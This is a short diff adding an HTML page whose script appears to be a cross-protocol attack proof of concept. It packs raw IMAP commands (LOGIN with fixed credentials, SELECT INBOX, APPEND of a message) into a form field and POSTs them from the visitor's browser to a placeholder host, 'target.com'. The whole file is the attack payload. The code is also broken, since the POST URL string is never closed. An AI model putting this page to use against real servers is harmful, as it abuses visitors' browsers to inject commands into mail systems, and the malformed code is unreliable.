@@ -1,0 +1,22 @@
+<body>
+</body>
+<script> //643  //174
+    var payload = '1 LOGIN bob bob\n' +
+        '2 SELECT INBOX\n' +
+        '3 APPEND "INBOX" (\\Seen) {448+}\r\n' +
+        'Date: Mon, 7 Feb 1994 21:52:25 -0800 (PST)\r\n' +
+        'From: Fred Foobar <foobar@Blurdybloop.COM>\r\n' +
+        'Subject: afternoon meeting\r\n' +
+        'To: mooch@owatagu.siam.edu\r\n';
+    var formData = new FormData();
+    formData.append("a", payload);
+
+
+
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "https://target.com);
+    xhr.send(formData);
+    var xhr2 = new XMLHttpRequest();
+    xhr2.open("GET", "https://target.com");
+    xhr2.send();
+</script>
